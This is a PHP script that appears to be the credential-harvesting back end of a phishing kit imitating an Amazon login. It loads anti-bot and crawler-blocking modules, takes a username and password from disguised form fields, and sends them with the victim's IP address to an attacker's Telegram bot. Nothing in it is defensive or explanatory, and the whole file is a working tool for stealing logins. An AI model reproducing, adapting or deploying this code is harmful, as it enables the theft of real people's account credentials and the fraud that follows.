<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "config.php";

$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['Lkail'];
$password = $_POST['Mart'];

if (isset($_POST['Lkail']) && isset($_POST['Mart'])) {
  if (strlen($password) > 5 && strlen($user) > 5) {

    ///////////////////////// MAIL PART //////////////////////


    $Info_LOG = "
|+++++++ AMA LOGIN ++++++++|
UserName         : $user 
Password         : $password 
IP  : $ip";
    // Don't Touche
    $url = 'https://api.telegram.org/bot$tgtoken/sendMessage';

    // Set the POST parameters
    
    $params = array(
      'chat_id' => '$tgid',
      'text' => $Info_LOG
    );
    
    // Send a POST request to the Telegram Bot API
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Handle the response from the Telegram Bot API
    if ($response === false) {
      // Request failed
      echo "Error sending message.";
    } else {
      // Request succeeded
      echo "Message sent successfully!";
    }
    //TELEGRAM 
    if ($send_tg == 1) {
      sendtoTG($tgid, $Info_LOG, $tgtoken);
    }
    ;
    
  } 
}

